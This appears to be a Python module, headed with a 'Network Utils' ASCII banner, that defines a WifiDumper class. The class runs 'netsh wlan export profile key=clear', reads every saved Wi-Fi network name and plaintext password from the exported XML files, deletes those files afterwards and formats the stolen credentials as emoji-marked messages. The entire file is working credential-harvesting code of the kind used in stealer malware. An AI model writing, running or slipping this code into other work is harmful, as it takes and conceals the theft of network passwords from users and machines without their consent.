import win32com.client
import subprocess as sp
from xml.dom import minidom
from os import listdir, remove
"""
ooooo      ooo               .                                       oooo        ooooo     ooo     .    o8o  oooo
`888b.     `8'             .o8                                       `888        `888'     `8'   .o8    `"'  `888
 8 `88b.    8   .ooooo.  .o888oo oooo oooo    ooo  .ooooo.  oooo d8b  888  oooo   888       8  .o888oo oooo   888   .oooo.o
 8   `88b.  8  d88' `88b   888    `88. `88.  .8'  d88' `88b `888""8P  888 .8P'    888       8    888   `888   888  d88(  "8
 8     `88b.8  888ooo888   888     `88..]88..8'   888   888  888      888888.     888       8    888    888   888  `"Y88b.
 8       `888  888    .o   888 .    `888'`888'    888   888  888      888 `88b.   `88.    .8'    888 .  888   888  o.  )88b
o8o        `8  `Y8bod8P'   "888"     `8'  `8'     `Y8bod8P' d888b    o888o o888o    `YbodP'      "888" o888o o888o 8""888P'
"""
class WifiDumper:
    def __init__(self) -> None:
        pass

    def extract_all(self) -> dict[str:str]:
        sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
        xmls = []
        wifis = {} 
        for file in listdir():
            if file.endswith(".xml") and file.startswith("Wi-Fi"):
                xmls.append(file)

        for xml in xmls:
            file = minidom.parse(xml)
            psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
            name = file.getElementsByTagName("name")[0].firstChild.data

            wifis.update({name:psw})

        for file in xmls:
            remove(file)
        return wifis

    def __str__(self) -> str:
        return "\n".join([f"🛜 *{k}*\n🔑 `{v}`\n" for k,v in self.extract_all().items()])